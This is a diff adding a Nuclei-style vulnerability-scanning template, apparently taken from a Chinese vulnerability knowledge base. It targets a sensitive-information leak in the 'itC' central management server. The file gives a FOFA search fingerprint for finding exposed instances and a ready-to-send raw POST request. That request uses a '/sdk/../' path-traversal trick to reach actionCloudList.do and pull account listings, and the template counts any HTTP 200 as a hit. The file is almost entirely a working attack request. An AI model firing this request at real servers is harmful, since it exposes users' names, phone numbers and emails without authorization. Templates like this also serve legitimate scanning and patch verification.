@@ -1,0 +1,36 @@
+id: poc-magf7kdxuhx32oap
+info:
+  name: itC 中心管理服务器actionCloudList存在敏感信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/magf7kdxuhx32oap'
+  tags: info-leak,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: magf7kdxuhx32oap
+    fofa: body="/mt_res_v3/img/public/logo.ico"
+http:
+- raw:
+  - 'POST /sdk/../vcs/actionCloudList.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 64
+
+
+    status=-1&platform=-1&account=&name=&phone_email=&size=19&ep_id='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
